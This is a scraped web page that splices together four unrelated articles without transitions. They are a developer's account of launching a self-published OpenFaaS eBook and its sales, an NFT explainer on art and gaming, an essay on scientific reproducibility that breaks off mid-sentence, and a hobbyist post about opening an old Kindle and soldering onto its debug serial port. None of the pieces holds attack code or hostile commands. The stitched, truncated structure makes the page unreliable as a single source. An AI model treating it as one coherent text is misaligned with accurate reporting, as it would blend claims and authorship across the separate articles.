   <article>

        

        <section>
            <div><p>I wanted to write to you all and share that I've launched my first eBook called <a href="https://gumroad.com/l/serverless-for-everyone-else">"Serverless For Everyone Else"</a> - within the first three hours of launch, nobody bought a single copy and I thought that I'd got it all wrong.</p>
<p>The "everyone else" is a reference to how complicated and difficult cloud-based and Kubernetes-based FaaS has become. The eBook sets out to help indie developers, and individuals within corporations build and deploy functions using a new version of OpenFaaS (<a href="https://github.com/openfaas/faasd">faasd</a>) which is open source and can run on a single VM or VPS without much overhead.</p>
<p>The real power of functions comes in extending existing systems through webhooks, polling, or querying and updating state. I'll share some of these use-cases below including how I used functions to extend how the Gumroad marketplace worked.</p>
<h2 id="whywriteanebookanyway">Why write an eBook anyway?</h2>
<p>Why did I decide to write an eBook? If you've ever written about tech or spoken at a conference, then Packt has probably approached you on LinkedIn about writing for them. From what I hear, that kind of arrangement means writing in a word doc, with tight deadlines and cranking out 300+ pages. It wasn't for me.</p>
<p>I'd seen <a href="https://twitter.com/dvassallo">Daniel Vassallo</a> create an eBook about AWS and Twitter. Daniel had really good results using Gumroad to sell his self-published eBooks. Then there's <a href="https://twitter.com/adamwathan">Adam Wathan</a> who built Tailwind CSS and trained himself up as a UI designer. He wrote his own eBook and in his yearly review mentioned that it did 600k USD in passive sales, without any promotion.</p>
<p>Whilst I didn't expect to get anywhere close to those numbers with a specialist topic, I did want to know if people would buy something from me.</p>
<h2 id="thetiersatlaunch">The tiers at launch</h2>
<p>I launched with three tiers, with names and clear differentiation:</p>
<ul>
<li>Minimalist - 25 USD - just the eBook</li>
<li>DevOps PRO - 50 USD - the eBook, plus a Grafana dashboard and the YAML for faasd to enable it</li>
<li>The learner - 99 USD - the eBook, plus a Grafana dashboard,  the YAML for faasd to enable it and a video workshop ready in 7 days</li>
<li>The team player - the learner, but for 5 people in your company</li>
</ul>
<p>As long as your options add some value, it seems that people enjoy the choice and are willing to pay a little more.</p>
<p>So I tweeted about the eBook and then nothing happened for three hours.</p>
<p>I interpreted this as a failure. I'd been reading <a href="https://amzn.to/38N5uZy">"The Right It: Why So Many Ideas Fail and How to Make Sure Yours Succeed"</a>, and had convinced myself that this was a sign that nobody wanted the material.</p>
<p>Then I got my first sale, and felt a little relief, maybe I was wrong?</p>
<p><img src="https://user-images.githubusercontent.com/6358735/104810538-27b57080-57ed-11eb-905b-d042d3046adf.png" alt="Sale email"></p>
<p>My sales graph had one initial spike on the Friday, and kept going into the Sunday. What had happened? My Twitter audience and GitHub Sponsors came to lend their support.</p>
<p><img src="https://pbs.twimg.com/media/ErzMnuOXMAA_REk?format=jpg&amp;name=medium" alt="Initial spike"></p>
<p>Then things died down, and over the course of the week I wondered if I'd failed to find market fit. <a href="https://gumroad.com/">Gumroad</a> was sending me almost no organic traffic, and nobody was landing on the page via SEO.</p>
<p>It was still more money than I had expected to earn from the eBook within the first week, but I felt like with so much interest in OpenFaaS, that there was a broader audience to reach.</p>
<h2 id="gettingasecondpeak">Getting a second peak</h2>
<p>After the first week, I released the video workshop to the people who'd purchased that tier (99USD), and to get some feedback, I offered a free upgrade to the workshop for the tier just below (50USD). That resulted in another large spike in interest.</p>
<p><img src="https://camo.githubusercontent.com/4e204e93dcfc33679c997c739fbf4f651fdf268d23961bae6f9b4c25ad4ec145/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f45735a3372753258634155513451673f666f726d61743d6a7067266e616d653d6d656469756d" alt="Video workshop"></p>
<p>How did I fulfil the upgrade / discount? I did it by writing a function and deploying it to my Raspberry Pi, so that Gumroad would send a webhook, my code would query the dollar amount, and then send out an email to the customer over AWS SES.</p>
<p><img src="https://pbs.twimg.com/media/EscxNxbXAAEHD8z?format=jpg&amp;name=large" alt="The function running"></p>
<p>Get the source code here: <a href="https://github.com/alexellis/gumroad-responder">alexellis/gumroad-responder</a></p>
<p>After the second peak, I saw a complete drop-off again - and started to wonder why?</p>
<p>99% of referrals came from Twitter and email, so had I exhausted my network?</p>
<p>I went ahead and added a link on openfaas.com and on my blog at the end of each post, to try and get more views on the eBook. It's too early to tell if that is going to work out, but has resulted in a few conversions already.</p>
<p>One of the bits of feedback I got on the eBook was how users enjoyed the use-cases, and practical examples. I'd recently started video streaming, so invited a friend to my YouTube channel to talk about serverless use-cases.</p>
<p><img src="https://camo.githubusercontent.com/544dffaf339a4ff44439db1c14cd953de385640b99231688f8a49db61294a02e/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f457378444745505841415968724c4f3f666f726d61743d6a7067266e616d653d6c61726765" alt="Video on use-cases"></p>
<p><a href="https://www.youtube.com/watch?v=mzuXVuccaqI&amp;feature=youtu.be">Watch the recording</a></p>
<p>The recording generated a lot of interest and engagement for existing eBook customers, but no additional sales.</p>
<p>You can get the <a href="https://gist.github.com/alexellis/c72d7a385f801cc9b8deb7fcaa531b69">show notes</a> here which have lots of links for use-cases from hobbyists, indie devs and corporate users of OpenFaaS.</p>
<h2 id="mynextmilestone">My next milestone</h2>
<p>I am pleased with the results so far, and have learned a lot along the way. I also had a few people reach out to me directly asking for help who had taken inspiration from seeing someone actually go ahead and take a calculated risk.</p>
<p>I haven't quite got to 10k USD, which is a nice round number to aim for, but I can roughly understand what each peak means here, and whether they are repeatable.</p>
<p><img src="https://pbs.twimg.com/media/EtARGclXMAg7nJ-?format=jpg&amp;name=medium" alt="Approaching 10k"></p>
<p>Once the sales do cross that threshold, I'll write-up a how to guide and share the command lines and tools I used to generate the eBook.</p>
<h2 id="whatsnext">What's next</h2>
<p>I committed to providing free updates - because the eBook was partially experimental and I wanted to validate that it was useful. Using the <a href="https://slack.openfaas.io/">OpenFaaS Slack</a> helped here - I opened a new channel for people who'd bought the book, and enjoyed the feedback and engagement from this.</p>
<p>Some people charge extra for community, but it felt too hard to enforce the access for this.</p>
<p><img src="https://user-images.githubusercontent.com/6358735/104810333-b628f280-57eb-11eb-8be9-a2f6c773346b.png" alt="Original cover"></p>
<p>I generated my own eBook cover originally and then only later, got a professional designer involved.</p>
<p><img src="https://static-2.gumroad.com/res/gumroad/2028406193591/asset_previews/741f2ad46ff0a08e16aaf48d21810ba7/retina/social4.png" alt="New design"></p>
<p>It turns out that the cover may not matter with Gumroad, as long as it's not awful. Since changing cover, I've only seen two new sales.</p>
<p>Now that I have some initial feedback and have learned that people will buy things from me, I want to let goodwill rebuild, and my audience "recover" before launching a second eBook. I've done a lot of free blog posts and writing on Kubernetes, Docker, Golang and Raspberry Pi and analytics from my blog shows me what's popular.</p>
<blockquote>
<p>In 14 days, I've received more money than OpenFaaS corporate users have paid into the project over 4 years.</p>
</blockquote>
<p>Just because something you give away for free is popular, doesn't mean that anyone will be willing to pay for it. OpenFaaS itself is testament to that, with many corporations using it in production, without contributing code or finances back.</p>
<p>The Right It has taught me not to invest too much effort up front in any one idea - as it's likely to fail. Instead I'll be testing ideas - getting feedback by investing a few hours or days, not weeks.</p>
<p>I am sure I've missed out lots of details here, so feel free to ask me questions.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h3>What are NFTs?</h3>
<p>Non-fungible token (NFT) is a term used to describe a unique digital asset whose ownership is tracked on a blockchain, such as Ethereum. Assets that can be represented as NFTs range from digital goods, such as items that exist within virtual worlds, to claims on physical assets such as clothing items or real estate. In the coming years, we will see NFTs used to unlock entirely new use cases that are only made possible by crypto.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/9799dae1-c2c9-4712-813b-10b23c279a36.jpeg" alt="Tokens redeemable for real world goods on Zora"></p><figcaption>Tokens redeemable for real world goods on Zora</figcaption></figure>
<p>While the Ethereum ecosystem is where most NFT activity has taken place to date, NFTs can exist on other smart contract platforms too. This is because, at their core, NFTs are just digital abstractions used to represent assets that are one of a kind. Non-fungible token isn’t the most intuitive term since we don’t commonly refer to the fungibility of objects in the physical world, but this is an important technical distinction when it comes to how an asset is represented on a blockchain. The goal for this post is not to detail every project within the NFT space, but to give a high level overview of what NFTs are, why they are interesting, and showcase some of their potential use cases.</p>
<h3>Why are NFTs interesting?</h3>
<p>NFTs are powerful because, when combined with other financial building blocks on Ethereum, they allow anyone to issue, own, and trade them. This makes interacting with NFTs significantly more efficient than in traditional platforms. The same reason why cryptocurrency used in payments is more efficient than traditional payments, that it is borderless and significantly easier to transfer, applies to NFTs. For example, if you want to create tradable in-game items as a game developer, then you can instantly have them be tradable through protocols that allow for decentralized exchange of NFTs. You don’t have to create your own marketplace or go through the onboarding process of a centralized platform in order to have the items be tradable.</p>
<p>NFT activity can go well past trading and include actions like being able to borrow and lend, support fractional ownership (e.g. <a href="https://www.niftex.com/">NIFTEX</a>), or use it as collateral in taking out a loan (e.g. <a href="https://nftfi.com/">NFTfi</a>). The possibilities are endless when you have the ability to combine NFTs with DeFi building blocks. For example, the game <a href="http://aavegotchi.com/">Aavegotchi</a> combines DeFi and NFT gaming where each Aavegotchi character represents a user’s collateral that is deposited within the lending platform <a href="https://aave.com/">Aave</a>, but you can also battle the characters, level them up, and equip wearables that change their traits.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/a1259686-6b61-455a-a204-f6e6da648f10.jpeg" alt="Aavegotchi gaming attributes change based on actions taken in DeFi"></p><figcaption>Aavegotchi gaming attributes change based on actions taken in DeFi</figcaption></figure>
<p>NFTs can cover an extremely wide variety of areas given they are simply digital representations of ownership but there has been significant growth within art and gaming in particular. Note that many digital works of art and gaming items are a subset of a larger category of NFT collectibles. There is also the emerging space of social tokens, which sometimes falls into the NFT category or that is closely related to it.</p>
<h3>Art</h3>
<p>NFTs can make fractionalized ownership more accessible, so if there is a valuable item that otherwise wouldn’t have been accessible for someone to own, now they can own a piece of it. Custody of a physical item still requires a trustworthy custodian, but being able to issue, hold, and trade it as a cryptoasset unlocks more use cases. One can also craft an NFT such that the creator receives a percentage of all secondary sales in a completely automated way. Artists typically don’t receive a cut of secondary sales in the traditional art world.</p>
<p>Programmable art is another interesting concept where a piece of artwork can incorporate on-chain data to dynamically update certain features or characteristics of the work. For example, one could create a piece of programmable art whose background changes if the price of ether goes above a certain dollar-value. There are countless creative possibilities.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/a51670c0-4a1c-4aaf-917d-0e551855b56d.jpeg" alt="Rutger van der Tas artwork that changes based on if it’s day or night"></p><figcaption>Rutger van der Tas artwork that changes based on if it’s day or night</figcaption></figure>
<p><a href="https://async.art/">Async Art</a> is a digital art marketplace known for programmable art. Many artists on Async sell artwork where someone is able to own the “master” copy which consists of a number of individual layers, but other people can own the individual layers and adjust their attributes over time. Imagine groups of people being able to own art collectively, where members of the group manage attributes of the work.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/fea07c75-8b3c-4592-b8f2-f5d6d92e544c.jpeg" alt="Osinachi artwork that includes a master and layers that can be individually adjusted"></p><figcaption>Osinachi artwork that includes a master and layers that can be individually adjusted</figcaption></figure>
<p>A common question about digital artwork is what can you do with it? These works can be displayed in digital frames in a physical setting for people to enjoy. The digital artist Beeple sold physical tokens along with his digital NFTs and made <a href="https://niftygateway.com/itemdetail/primary/0x6e5dc5405baefb8c0166bcc78d2692777f2cbffb/21">$3.5 million</a> from sales in an auction on the Nifty Gateway marketplace.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/8689be31-b33f-46ac-94aa-feea3a1b3dd1.jpeg" alt="Artist Beeple’s physical token that came with the NFT sale"></p><figcaption>Artist Beeple’s physical token that came with the NFT sale</figcaption></figure>
<p>Digital artwork can also be displayed in online collections like a <a href="https://superrare.co/thevault/collection">SuperRare profile</a> as well as in virtual worlds. There are a number of art galleries within <a href="http://cryptovoxels.com/">Cryptovoxels</a>, a virtual world where users can buy and sell land parcels as NFTs. As virtual reality spaces become more popular, having digital art to display will become more common. This wouldn’t be much different than someone spending money on video game items to customize a character’s appearance, already a multi-billion dollar industry.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/7386d358-d43d-4934-9ea5-b51c33932365.jpeg" alt="Digital art gallery in Cryptovoxels"></p><figcaption>Digital art gallery in Cryptovoxels</figcaption></figure>
<p>A common skepticism is that someone can just take a screenshot of the image or get a digital file so it’s not really scarce. However, the same argument could apply to physical items as well. Anyone can take a photo of the Mona Lisa or create a replica of it, but it isn’t the real item from the artist. People are willing to pay a premium for the original work. Another interesting aspect of digital art or collectibles is that you can easily verify the item’s ownership history. Some digital items might be worth more depending on who owned it in the past.</p>
<p>With NFTs, you can also prove that the item is real and tamper proof. This is an issue in the physical collectibles space. For example, a <a href="https://en.wikipedia.org/wiki/T206_Honus_Wagner">T206 Honus Wagner baseball card</a> was sold to Wayne Gretzky for $451k and sold again for several million dollars. One of the sellers of the card later admitted in court to trimming the card’s edges to make it look better. You can ensure NFT supply doesn’t change and there’s no counterfeit or continued printing. For example, there are many <a href="https://www.youtube.com/watch?v=AAvLC3fz068&amp;">counterfeit Black Lotus</a> cards in the popular game Magic: The Gathering. Common verification methods include bending the card to make sure it doesn’t crease or going through centralized grading services whose rating significantly affects the card's value.</p>
<h3>Gaming</h3>
<p>Steam, a popular video game platform, has a <a href="https://steamcommunity.com/market/?">Community Market</a> where in-game items can be bought and sold. Steam’s marketplace is centralized and collects a transaction fee of 5% for each item from the buyer. Games like Team Fortress 2 and Dota 2 take an additional fee of 10% for their items sold.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/4ad85fcf-b986-4b60-9fb5-925200fde3a9.jpeg" alt="Steam Community Market"></p><figcaption>Steam Community Market</figcaption></figure>
<p>Steam also restricts user wallet balances to $2,000 and the price of a single item to $1,800. While these cases are outliers, many in-game items can actually sell for significantly larger amounts such as the <a href="https://www.engadget.com/2013-11-06-dota-2-pink-war-dog-courier-sells-for-38-000.html">DotA 2 pink war dog courier</a> for $38,000. Within the crypto space there have also been high priced sales such as the $170,000 <a href="https://thenextweb.com/hardfork/2018/09/05/most-expensive-cryptokitty/">CryptoKitty</a>. Similarly Magic: The Gathering’s coveted <a href="https://www.polygon.com/2019/3/5/18251623/magic-the-gathering-black-lotus-auction-price">Black Lotus</a> card sold for $166,100. There is certainly demand for valuable in-game items. In decentralized marketplaces, there isn’t a limit imposed on what game items can be sold and for what amount.</p>
<p>Decentralized marketplaces can significantly reduce transaction fees due to the improved efficiency of starting up and operating a marketplace. Marketplaces can also improve overall user experience and increase interest in the game. Hearthstone is a wildly popular digital collectible card game created by Blizzard Entertainment that had over <a href="https://variety.com/2018/gaming/news/hearthstone-has-over-100-million-players-1203019919/">100 million players</a> in 2018. Hearthstone opted to not have a marketplace for their cards which leaves opportunity for other digital collectible card games that allow for an open marketplace. <a href="https://godsunchained.com/">Gods Unchained</a> and <a href="https://www.skyweaver.net/">SkyWeaver</a> are two trading card games (TCGs) that have cards that are freely tradable. You are also able to earn cards as you level up in the game. Players that did not purchase packs of cards will still be able to improve upon the game’s default decks. It’s an exciting feeling knowing that the earned cards have real world value and can be sold or traded for other cards. Gods Unchained also lets users earn tokens for when they win a match or refer their friend. The tokens themselves unlock rare in-game items and are also freely tradable.</p>

<p>One of the most popular games in crypto is <a href="https://axieinfinity.com/">Axie Infinity</a>. You battle with a team of pet Axies and level them up. There's no aspect of the gameplay that feels like a blockchain game but there is the added benefit of being able to openly trade the Axies on NFT marketplaces such as <a href="https://opensea.io/">OpenSea</a>. The game has become popular in the <a href="https://www.coindesk.com/nft-game-filipinos-covid">Philippines</a> and earning tokens from the game has become a viable source of income for players even <a href="https://www.playtoearn.online/2020/07/08/axie-infinity-beats-minimum-wage-in-many-countries/">beating minimum wage</a> in many countries. There is also a decentralized autonomous organization (DAO) called <a href="https://yieldguild.io/">Yield Guild Games</a> which leases Axies to players that want to get started with the game but don’t have the funds to purchase them. Several rare Axies were even <a href="https://www.delphidigital.io/reports/why-we-spent-159k-on-digital-battle-pets-2/">purchased</a> for $159,000 total.</p>

<p>There’s another popular game <a href="https://zkga.me/">Dark Forest</a> where you can explore different planets and collect Artifact NFTs on new planets, which give bonuses when attached to the planet. Being able to discover and collect these items or even win them in a battle and then trade them in decentralized marketplaces can make the game even more fun.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/be66b61a-05f0-46b7-aa8f-f7ed542d5cd3.jpeg" alt="Planet in Dark Forest which has an Artifact NFT"></p><figcaption>Planet in Dark Forest which has an Artifact NFT</figcaption></figure>

						<p>The 21st century has seen some phenomenal advances in our ability to make scientific discoveries. Scientists have developed <a href="https://www.nature.com/articles/nrd.2017.243">new technology</a> to build vaccines swiftly, <a href="https://deepmind.com/blog/article/alphafold-a-solution-to-a-50-year-old-grand-challenge-in-biology">new algorithms</a> to predict the structure of proteins accurately, <a href="https://www.genome.gov/about-genomics/fact-sheets/DNA-Sequencing-Costs-Data">new equipment</a> to sequence DNA rapidly, and <a href="https://www.vox.com/platform/amp/energy-and-environment/2020/10/21/21515461/renewable-energy-geothermal-egs-ags-supercritical">new engineering solutions</a> to harvest energy efficiently. But in many fields of science, reliable knowledge and progress advance <a href="https://www.theatlantic.com/science/archive/2018/11/diminishing-returns-science/575665/">staggeringly</a> <a href="https://marginalrevolution.com/marginalrevolution/2019/11/is-the-rate-of-scientific-progress-slowing-down.html">slowly</a>. What slows it down? And what can we learn from individual fields of science to pick up the pace across the board – without compromising on quality?</p>
<p>By and large, scientific research is published in journals in the form of papers – static documents that do not update with new data or new methods. Instead of sharing the data and the code that produces their results, most scientists simply publish a textual description of their research in online publications. These publications are usually hidden behind paywalls, making it harder for outsiders to verify their authenticity.</p>
<p>On the occasion when a reader spots a discrepancy in the data or an error in the methods, they must read the intricate details of a study’s method scrupulously, and cross-check the statistics manually. When scientists don’t share the data to produce their results openly, the task becomes even harder. The process of error correction – from scientists publishing a paper, to readers spotting errors, to having the paper corrected or retracted – can take <a href="https://retractionwatch.com/2017/04/26/university-asked-numerous-retractions-eight-months-later-three-journals-done-nothing/">years</a>, assuming those errors are spotted at all.</p>
<p>When scientists reference previous research, they cite entire papers, not specific results or values from them. And although there is <a href="https://mattsclancy.substack.com/p/does-science-self-correct">evidence</a> that scientists hold back from citing papers once they have been retracted, the problem is compounded over time – consider, for example, a researcher who cites a study that itself derives its data or assumptions from prior research that has been disputed, corrected or retracted. The longer it takes to sift through the science, to identify which results are accurate, the longer it takes to gather an understanding of scientific knowledge.</p>
<p>What makes the problem even more challenging is that flaws in a study are not necessarily mathematical errors. In many situations, researchers make fairly arbitrary decisions as to how they collect their data, which methods they apply to analyse them, and which results they report – altogether leaving readers blind to the impact of these decisions on the results.</p>
<p>This murkiness can result in what is known as p-hacking: when researchers selectively apply arbitrary methods in order to achieve a particular result. For example, in a study that compares the well-being of overweight people to that of underweight people, researchers may find that certain cut-offs of weight (or certain subgroups in their sample) provide the result they’re looking for, while others don’t. And they may decide to only publish the particular methods that provided that result.</p>
<p>If a reader can’t find out how different versions of a study method have affected the results, how are they to know whether the finding really was robust – that it would be found regardless of how the data was looked at?</p>
<p>Now, it’s common to assume that these errors and flaws are largely smoothed out during the process of peer review, where peer scientists are asked to scrutinise a study and recommend to journal editors whether it should be revised or even published at all. But unfortunately peer review often fails to accomplish this, as the scientist Stuart Ritchie has described in his book <a href="https://us.macmillan.com/books/9781250222695"><i>Science Fictions</i></a>.</p>
<p>Substandard methods and questionable research practices are widespread even in published work. There is an enormous number of journals available, with different standards of publication, in which scientists can publish their work if they are rejected by some. And many lines of <a href="https://www.frontiersin.org/articles/10.3389/fnhum.2018.00037/full">evidence</a> suggest that ‘high impact’ journals (journals which are said to be highly reputable and have a wide reach) accept papers with similar or weaker methods than low-impact journals do.</p>
<p>Peer review instead functions predominantly as a practice of gatekeeping, as the philosophers of science Liam Bright and Remco Heesen have <a href="https://academic.oup.com/bjps/advance-article/doi/10.1093/bjps/axz029/5526887">explained</a>. Reviewers provide scientists with comments that are rarely made public. Whether research is published in a particular journal largely depends on the idiosyncratic decisions of reviewers who are available at the time and who are liked by the journal’s editors.</p>
<p>Peer review filters which research is published, with no use of transparent metrics for others to understand the reasoning behind these choices. The lack of transparency lends itself to misconduct – reviewers may discourage the publishing of science that challenges the prevailing consensus of the time or fails to replicate it – and hype, encouraging the publication of results that seem exciting over those that provide nuance.</p>
<p>These decisions have consequences, because journals are the dominant platform for sharing scientific research. When non-scientists, who want to apply scientific knowledge elsewhere, read research, they have little way of knowing which methods are sound and which results are reproducible or replicable.	<sup data-close="x" data-content="[1]">[1]</sup>
	<span>Reproducibility relates to whether the results can be reproduced using the same data and code as in the original analysis. Replicability relates to whether other scientists find similar results in their own studies.</span>
	 Other scientists can face the same problems, finding it difficult to assess the state of knowledge in a field, particularly if they have expertise in a different subject. This is troubling: the longer it takes to sift through the research to find out which results are reliable, the longer it takes to apply knowledge to solve new problems.</p>
<p>This view paints a bleak picture of the state of scientific knowledge, and the question that arises is: is all of science like this?</p>
<p>Fortunately, the answer is no. But unfortunately, many good practices are fairly modern and limited to specific domains. Here are some of them.</p>
<p>The remarkable <a href="https://deepmind.com/blog/article/alphafold-a-solution-to-a-50-year-old-grand-challenge-in-biology">breakthrough</a> by DeepMind in 2020 – in accurately predicting the folded structure of proteins using only the code of protein sequences – was made possible because DeepMind’s AlphaFold algorithm was trained using data from <a href="https://www.rcsb.org/pages/about-us/index">Protein Data Bank</a>, a vast public database that dates back to 1971. Molecular scientists have been carefully applying difficult laboratory techniques to establish the structure of proteins and have manually submitted information about them to this database <a href="https://journals.iucr.org/a/issues/2008/01/00/sc5004/">for decades</a>. In parallel, data managers have been reviewing each of their submissions for accuracy. The platform now harbours over 150,000 curated entries of protein structures.</p>
<p>With databases like this, the benefits to other scientists are enormous: specifically, understanding the structure of proteins can help scientists design precise drugs that fit into them, as has been done for the <a href="https://cen.acs.org/analytical-chemistry/structural-biology/structural-biologists-revealed-new-coronaviruss/98/i17">spike protein</a> of the coronavirus. It can also help them understand why resistance to a drug has developed, such as in <a href="https://www.nature.com/scitable/topicpage/the-protein-data-bank-exploring-biomolecular-structure-14199109/">HIV research</a>. But more broadly, individual researchers no longer have to rediscover these protein structures over and over again if they have already been shared publicly, if they want to use that knowledge for other purposes.</p>
<p>The practice of sharing data is also the norm in the neighbouring field of genomics. The tradition largely stems from the <a href="https://en.wikipedia.org/wiki/Human_Genome_Project">Human Genome Project</a>, which began in 1990 and aimed to determine the entire code of the human genome. During the project, a group of scientists developed protocols called the <a href="https://www.annualreviews.org/doi/10.1146/annurev-genom-083115-022515">Bermuda Principles</a>, which recommended that labs working on the project should upload the details of any new genetic sequences that they discovered onto public data repositories on a daily basis.</p>
<p>Though the project was completed in 2003, the movement paved the way for data sharing principles in many genetic projects to come, such as the HapMap project, the 1000 Genomes project, dbGaP, and more recently, GISAID and NextStrain – two databases which publicly share genomes of the SARS-CoV-2 (Covid-19) virus.	<sup data-close="x" data-content="[2]">[2]</sup>
	<span>The HapMap project is a project that maps common genetic mutations of the human genome, while the 1000 Genomes project aims to develop a map of rare genetic mutations. dbGaP is a database of genetic mutations that are associated with medical traits and diseases.</span>
	 As with protein databases, these open sharing practices are remarkably important in genomics, in particular because they allow scientists to investigate a large number of genes and mutations at the same time, each detailed with a large amount of information that other scientists have collected.</p>
<p>These databases are immensely useful in sharing <i>data</i> for other researchers to analyse, but different tools are necessary for researchers to share the code used to <i>analyse data</i> – for example, if they want to test specific hypotheses. Some researchers voluntarily share their analysis code on <a href="https://en.wikipedia.org/wiki/Git">GitHub</a> and <a href="http://osf.io/">OSF</a>, two platforms where people can upload their data, code and research plans and update them when changes are made. But the practice of sharing code is not widely used by scientists even within these fields.</p>
<p>In computer science however, there are examples of journals that work with version control tools like Git. Take <a href="https://peerj.com/articles/cs-147/">JOSS</a> as an illustration, a journal that publishes research describing open source software. JOSS is actually built upon the platform of GitHub: software developers submit their software together with working papers describing them to the journal via GitHub, and the journal’s reviewers provide comments on their code and suggest revisions to their work publicly. Both reviewers’ comments and past versions of the software are therefore transparent and accessible to the public.</p>
<p>Apart from these examples of sharing data and code openly, some fields already commonly try to tackle p-hacking and other questionable research practices, described before. In economics, researchers typically perform “<a href="http://www.nickchk.com/robustness.html">robustness checks</a>” to demonstrate that their …</p></div></div></div>

<p>I fancied getting an eink screen to use for future projects. I bought a wee one with a raspberry pi “hat” attached. However, I realised later that I could maybe just re-purpose an old Amazon Kindle ebook reader.</p>



<p>I’ve messed with Kindles before, ages ago: I ported an <a href="https://blog.lidskialf.net/2010/10/09/kif-an-infocom-text-adventure-interpreter-for-the-kindle/">Infocom interpreter</a> and a <a href="https://blog.lidskialf.net/2010/10/20/mangle-a-better-manga-reader-for-the-kindle/">Manga</a> reader to it. I managed to get Amazon’s own software to load them as “Kindlets” and show them integrated into their ebook reader. However, now I just want a nice cheap Linux based eink development platform.</p>



<p>Cheap Kindle From Ebay (and why)</p>



<p>So, off to ebay I went! I saw a number of really cheap ones marked “BLOCKED BY AMAZON”; I decided not to go for these since theoretically they might have been stolen. In the end, I went for £7 Kindle 4 “non-touch”.</p>



<p>A few days later, it turned up. And I discovered <em>why</em> it might have been so cheap: its stuck in some sort of unquittable demo mode:</p>



<figure><img data-attachment-id="1725" data-permalink="https://blog.lidskialf.net/kindle_demo_mode/" data-orig-file="https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg" data-orig-size="892,1239" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="kindle_demo_mode" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=216" data-large-file="https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=737" src="https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=737" alt="" srcset="https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=737 737w, https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=108 108w, https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=216 216w, https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg 892w" sizes="(max-width: 737px) 100vw, 737px"></figure>



<p>I did some googling and although it seems later Kindle versions can be un-demo-mode-ed, nothing seemed to work for this version. I don’t actually care though; I don’t want to run the original Kindle ebook software on this.</p>



<p>So, the next step is to gain access. Browsing the <a href="https://www.mobileread.com/forums/showthread.php?t=166687">mobileread forums</a> showed it has a debug serial port: time to open the case!</p>



<p>Physical Access Granted!</p>



<p>This was kinda tricky! There are multiple clips all round it and the case is glued onto the battery compartment, so judicious application of a Big Knife was required to persuade it to let go. I cleaned the glue up with some Acetone.</p>

<ul><li>Red: annoying clips</li><li>Purple: <strong>really</strong> annoying glue.</li><li>Yellow: the serial port!</li></ul>



<p>As usual for this sort of thing, the serial port is missing its socket, so we need to solder onto the tiny contacts on the board. I like to use ~0.2mm wirewrap wire for this sort of thing, and the surface mount rework bit for my soldering iron:</p>







<p>I don’t want to leave any wires flapping about, but I also know at some point I’m going to screw up and need serial port console access, so I came up with a solution and attached it:</p>







<p>I superglued a piece of Veroboard onto the kindle’s PCB, then soldered wirewrap wires from the tiny PCB contacts onto one end. Finally, I soldered a larger, more conventional “Dupont” cable socket on the other end so I could easily attach and detach from it. Oh, the top cable on the Kindle PCB is 0v/GND, the others are TX and RX (I forget the order of those two).</p>



<p>Final hurdle: the kindle serial port runs at 1.8v, so I needed a serial port adaptor which supports that:</p>



<figure><img data-attachment-id="1737" data-permalink="https://blog.lidskialf.net/kindle_usbserial/" data-orig-file="https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg" data-orig-size="545,828" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="kindle_usbserial" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg?w=197" data-large-file="https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg?w=545" src="https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg?w=545" alt="" srcset="https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg 545w, https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg?w=99 99w, https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg?w=197 197w" sizes="(max-width: 545px) 100vw, 545px"></figure>



<p>The one I bought does 5v. 3.3v, 2.5v, and 1.8v: it’s pretty neat!</p>



<p>Root Access Granted!</p>



<p>Next, I attached the serial adapter to my laptop, ran the <strong>minicom</strong> serial port software and rebooted the Kindle. Then, once I (inevitably) swapped the TX and RX wires around, I was greeted by this!</p>

Welcome to Kindle!

kindle login: </code></pre>



<p>Great, so that’s booting the uboot bootloader, then booting into linux and asking me to login.</p>



